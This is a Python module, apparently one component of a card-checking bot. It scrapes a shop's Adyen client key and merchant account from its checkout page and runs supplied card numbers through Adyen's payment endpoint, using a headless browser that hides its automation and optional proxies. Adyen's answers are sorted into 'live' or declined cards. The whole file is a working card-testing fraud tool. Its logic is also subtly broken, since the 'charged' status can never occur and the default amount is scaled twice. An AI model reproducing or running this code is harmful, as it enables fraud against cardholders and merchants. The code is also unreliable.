"""The Adyen charge gate.

The card is charged at a shop that takes Adyen, so the answer is the
issuer's own refusal and not a word about the shop.  The amount is
ours: nineteen ninety nine, so the card is charged twenty dollars and
the shop keeps nothing of it.

How the charge is made:

  * the shop's page is opened in a browser.  It carries Adyen's own
    client key, its merchant account and the price of the basket,
  * the card is encrypted in that page with Adyen's own javascript, so
    the number never leaves the browser in the clear,
  * the encrypted card is sent to Adyen with the amount, and Adyen
    answers with what the issuer said.

The shop's page is the only place the merchant's name and key are
known, so a page is needed.  A link to a shop's Adyen checkout can be
given with the ADN_PAYMENT_URL setting, and the /aco command takes
one for a single run.
"""
import asyncio
import json
import os
import re
import sys
import time
import uuid

import httpx

sys.path.insert(0, os.path.dirname(__file__))

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")

# The price of the charge, in the small units the money is counted in.
DEFAULT_AMOUNT = 1999
DEFAULT_CURRENCY = "USD"

ADN_CONFIG_FILE = os.environ.get("ADN_CONFIG_FILE") or "/root/hitchecker/adyen_config.json"
PAYMENT_URL_FILE = os.environ.get("ADN_PAYMENT_URL_FILE") or "/root/hitchecker/adyen_payment_url.txt"

# the answers Adyen gives, and what they mean for the card
DECLINED_WORDS = (
    "refused", "declined", "insufficient", "do not honor", "do_not_honor",
    "not enough balance", "lost card", "stolen card", "pickup card",
    "restricted card", "security violation", "incorrect cvc", "incorrect cvv",
    "incorrect security code", "incorrect pin", "invalid card number",
    "invalid expiry", "expired card", "not supported", "not permitted",
    "transaction not allowed", "try again later", "card velocity",
    "withdrawal count", "merchant blacklist", "acquirer fraud",
    "authentication required", "3d secure required", "suspicious",
    "canceled", "blocked card",
)
LIVE_WORDS = (
    "authorised", "authorized", "received", "pending", "3d secure",
    "identify shopper", "challenge shopper", "redirect shopper",
    "partially authorised", "partially authorized", "action required",
)


def _load_config():
    """The merchant's name, the client key and the page of the shop."""
    cfg = {}
    try:
        if os.path.exists(ADN_CONFIG_FILE):
            with open(ADN_CONFIG_FILE, encoding="utf-8") as f:
                cfg = json.load(f) or {}
    except Exception:
        cfg = {}

    for key in ("client_key", "merchant_account", "payment_url", "amount", "currency"):
        env = os.environ.get("ADN_" + key.upper())
        if env:
            cfg[key] = env

    # a payment link kept in a file
    if not cfg.get("payment_url"):
        try:
            if os.path.exists(PAYMENT_URL_FILE):
                with open(PAYMENT_URL_FILE, encoding="utf-8") as f:
                    url = f.read().strip()
                if url:
                    cfg["payment_url"] = url
        except Exception:
            pass
    return cfg


def save_payment_url(url):
    """Keep the payment link of the shop for the next run."""
    try:
        with open(PAYMENT_URL_FILE, "w", encoding="utf-8") as f:
            f.write(url.strip())
        return True
    except Exception:
        return False


def parse_adyen_url(url):
    """Read the parts of an Adyen payment link.

    Only a real Adyen link is taken.  The link carries the payment
    session, so it is what a card has to be charged against.
    """
    if not url:
        return None
    text = str(url).strip()
    if " " in text or "\n" in text:
        return None
    low = text.lower()
    if not (low.startswith("http://") or low.startswith("https://")):
        return None
    if not any(mark in low for mark in
               ("adyen.com", "adyen.link", "checkoutshopper", "adyenpayments")):
        return None
    out = {"url": text}
    for name in ("sessionRef", "session_id", "paymentId", "paymentSessionId",
                 "redirectResult", "reference", "merchantAccount", "orderNo"):
        m = re.search(r"[?&]%s=([^&\s]+)" % name, text)
        if m:
            out[name] = m.group(1)
    m = re.search(r"[?&]amount=([\d.]+)", text)
    if m:
        out["amount"] = m.group(1)
    m = re.search(r"[?&]currency=([A-Za-z]{3})", text)
    if m:
        out["currency"] = m.group(1)
    return out


def _page_config(html):
    """The merchant's name, the key and the price, out of the shop's page."""
    cfg = {}

    def grab(pattern, cast=str):
        m = re.search(pattern, html or "")
        if not m:
            return None
        try:
            return cast(m.group(1))
        except Exception:
            return None

    cfg["merchant_account"] = grab(r'"merchantAccount"\s*:\s*"([^"]+)"')
    cfg["client_key"] = grab(r'"clientKey"\s*:\s*"([^"]+)"')
    cfg["environment"] = grab(r'"environment"\s*:\s*"([^"]+)"')
    cfg["payment_session_id"] = grab(r'"paymentSessionId"\s*:\s*"([^"]+)"')
    if not cfg["payment_session_id"]:
        cfg["payment_session_id"] = grab(r'"id"\s*:\s*"([A-Za-z0-9]{20,})"')
    cfg["amount"] = grab(r'"amount"\s*:\s*\{\s*"currency"\s*:\s*"([A-Za-z]{3})"', str)
    cfg["value"] = grab(r'"amount"\s*:\s*\{\s*"value"\s*:\s*(\d+)', int)
    cfg["reference"] = grab(r'"reference"\s*:\s*"([^"]+)"')
    return cfg


def _host_of(page_url):
    """The address of Adyen the money goes to."""
    m = re.search(r"https?://([^/]+)", page_url or "")
    if not m:
        return "https://checkoutshopper-live.adyen.com"
    host = m.group(1).lower()
    if "checkoutshopper-test" in host or "-test" in host:
        return "https://checkoutshopper-test.adyen.com"
    if host.startswith("checkoutshopper"):
        return "https://" + host
    if "test.adyen" in host:
        return "https://checkoutshopper-test.adyen.com"
    return "https://checkoutshopper-live.adyen.com"


def _verdict(result_code, refusal_reason, extra=""):
    """What Adyen said, in the words of the card's owner."""
    text = " ".join(str(x) for x in (result_code, refusal_reason, extra) if x).strip()
    low = text.lower()
    if not low:
        return "declined", "Adyen gave no answer"
    for word in DECLINED_WORDS:
        if word in low:
            reason = str(refusal_reason or result_code or word).strip()
            return "declined", reason[:120]
    for word in LIVE_WORDS:
        if word in low:
            reason = str(refusal_reason or result_code or word).strip()
            return "live", reason[:120]
    return "declined", (str(refusal_reason or result_code) or "refused")[:120]


_browser_state = {"browser": None, "playwright": None}


async def _get_browser():
    """One browser for all the checks, so a card is not slow to start."""
    if _browser_state["browser"] is not None:
        try:
            if _browser_state["browser"].is_connected():
                return _browser_state["browser"]
        except Exception:
            pass
    try:
        from playwright.async_api import async_playwright
    except Exception:
        return None
    try:
        if _browser_state["playwright"] is None:
            _browser_state["playwright"] = await async_playwright().start()
        _browser_state["browser"] = await _browser_state["playwright"].chromium.launch(
            headless=True,
            args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage",
                  "--disable-gpu", "--disable-blink-features=AutomationControlled"])
    except Exception:
        _browser_state["browser"] = None
    return _browser_state["browser"]


async def _encrypted_card(page, client_key, cc, mm, yy, cvv):
    """The card, encrypted by the shop's own javascript.

    The encryption happens inside the shop's page, so the number never
    goes out of it in the clear.
    """
    try:
        return await page.evaluate(
            """async (args) => {
                const {key, number, month, year, cvc} = args;
                const adyen = window.adyen;
                if (!adyen || !adyen.encrypt) return {error: 'the page has no adyen encrypt'};
                if (!key) return {error: 'the page has no client key'};
                try {
                    const card = {
                        number: number,
                        expiryMonth: month,
                        expiryYear: year,
                        cvc: cvc,
                        holderName: 'John Smith'
                    };
                    const out = await adyen.encrypt.cardData(card, key);
                    return {data: out};
                } catch (e) {
                    return {error: 'the card was not encrypted: ' + (e && e.message ? e.message : e)};
                }
            }""",
            {"key": client_key, "number": cc, "month": mm, "year": yy, "cvc": cvv})
    except Exception as e:
        return {"error": "the page could not be asked: %s" % str(e)[:80]}


async def adyen_co_check(cc, mm, yy, cvv, payment_url=None, session_cache=None,
                         proxy=None, amount=None, currency=None):
    """Charge the card at the shop and say what the issuer said.

    Returns (status, message, card_info, elapsed, cached).  The status
    is "charged", "live", "declined" or "error".
    """
    start = time.time()
    if len(yy) == 2:
        yy = "20" + yy
    mm = mm.zfill(2)

    cfg = _load_config()
    url = payment_url or cfg.get("payment_url") or ""
    parsed = parse_adyen_url(url)
    if not parsed:
        return ("error", "no adyen payment link is known. Give one with /aco "
                         "or set ADN_PAYMENT_URL.", None, 0, False)

    want_amount = amount or cfg.get("amount") or DEFAULT_AMOUNT
    if isinstance(want_amount, str):
        try:
            want_amount = float(want_amount)
        except Exception:
            want_amount = DEFAULT_AMOUNT
    want_amount = int(round(float(want_amount) * 100))
    want_currency = (currency or cfg.get("currency") or DEFAULT_CURRENCY).upper()

    browser = await _get_browser()
    if browser is None:
        return ("error", "the browser is not there", None, 0, False)

    ctx = None
    try:
        ctx = await browser.new_context(user_agent=UA,
                                        viewport={"width": 1280, "height": 1000},
                                        locale="en-US")
        await ctx.add_init_script(
            "Object.defineProperty(navigator,'webdriver',{get:()=>undefined});")
        page = await ctx.new_page()
        await page.goto(parsed["url"], wait_until="domcontentloaded", timeout=60000)
        await page.wait_for_timeout(5000)

        html = await page.content()
        page_cfg = _page_config(html)

        client_key = page_cfg.get("client_key") or cfg.get("client_key")
        merchant = page_cfg.get("merchant_account") or cfg.get("merchant_account")
        if not client_key:
            return ("error", "the shop's page has no adyen client key", None,
                    round(time.time() - start, 2), False)
        if not merchant:
            return ("error", "the shop's page has no adyen merchant account", None,
                    round(time.time() - start, 2), False)

        # the card is encrypted in the shop's page
        enc = await _encrypted_card(page, client_key, cc, mm, yy, cvv)
        if not enc.get("data"):
            return ("error", enc.get("error") or "the card was not encrypted", None,
                    round(time.time() - start, 2), False)
        card_data = enc["data"]

        reference = page_cfg.get("reference") or parsed.get("reference") or \
            ("order-" + uuid.uuid4().hex[:16])
        host = _host_of(page.url)
        endpoint = host + "/checkoutshopper/v71/payments"

        payload = {
            "amount": {"currency": want_currency, "value": want_amount},
            "reference": reference,
            "merchantAccount": merchant,
            "paymentMethod": {
                "type": "scheme",
                "encryptedCardNumber": card_data.get("encryptedCardNumber"),
                "encryptedExpiryMonth": card_data.get("encryptedExpiryMonth"),
                "encryptedExpiryYear": card_data.get("encryptedExpiryYear"),
                "encryptedSecurityCode": card_data.get("encryptedSecurityCode"),
                "holderName": "John Smith",
            },
            "returnUrl": parsed["url"],
            "browserInfo": {
                "colorDepth": 24,
                "javaEnabled": False,
                "javaScriptEnabled": True,
                "language": "en-US",
                "screenHeight": 1080,
                "screenWidth": 1920,
                "timeZoneOffset": -180,
                "userAgent": UA,
            },
            "origin": host,
            "shopperInteraction": "Ecommerce",
            "shopperReference": uuid.uuid4().hex[:16],
        }
        if page_cfg.get("payment_session_id"):
            payload["paymentSessionId"] = page_cfg["payment_session_id"]

        client_kwargs = {"timeout": httpx.Timeout(45.0)}
        if proxy:
            client_kwargs["proxy"] = proxy
        async with httpx.AsyncClient(**client_kwargs) as client:
            r = await client.post(endpoint, json=payload, headers={
                "User-Agent": UA,
                "Content-Type": "application/json",
                "Accept": "application/json",
                "Origin": host,
                "Referer": parsed["url"],
            })
        try:
            body = r.json()
        except Exception:
            return ("error", "adyen gave no answer (http %s)" % r.status_code, None,
                    round(time.time() - start, 2), False)

        elapsed = round(time.time() - start, 2)
        if r.status_code != 200:
            message = body.get("message") or body.get("errorCode") or ("http %s" % r.status_code)
            return ("error", "adyen said: %s" % str(message)[:140], None, elapsed, False)

        result_code = body.get("resultCode") or ""
        refusal = body.get("refusalReason") or ""
        auth_code = body.get("authCode") or ""
        psp = body.get("pspReference") or body.get("paymentMethod", {}).get("brand") or ""
        status, reason = _verdict(result_code, refusal, auth_code)

        info = " ".join(str(x) for x in (psp, auth_code) if x).strip() or "ADYEN"
        if status == "charged":
            return ("charged", "Charged $%.2f - %s" % (want_amount / 100.0, reason), info,
                    elapsed, False)
        if status == "live":
            return ("live", "CCN Live - %s" % reason, info, elapsed, False)
        return ("declined", reason or "Declined", info, elapsed, False)

    except httpx.TimeoutException:
        return ("error", "adyen did not answer in time", None, round(time.time() - start, 2), False)
    except Exception as e:
        return ("error", "%s: %s" % (type(e).__name__, str(e)[:90]), None,
                round(time.time() - start, 2), False)
    finally:
        try:
            if ctx is not None:
                await ctx.close()
        except Exception:
            pass


async def adyen_charge_check(cc, mm, yy, cvv, proxy=None, **kwargs):
    """The charge gate, in the words the registry uses."""
    status, message, info, elapsed, _cached = await adyen_co_check(
        cc, mm, yy, cvv, payment_url=kwargs.get("payment_url"), proxy=proxy,
        amount=kwargs.get("amount"), currency=kwargs.get("currency"))
    if status == "charged":
        return "Approved - %s | %s [%ss]" % (message, info or "ADYEN", elapsed)
    if status == "live":
        return "Declined - %s | %s [%ss]" % (message, info or "ADYEN", elapsed)
    if status == "declined":
        return "Declined - %s | %s [%ss]" % (message, info or "ADYEN", elapsed)
    return "Error - %s [%ss]" % (message, elapsed)
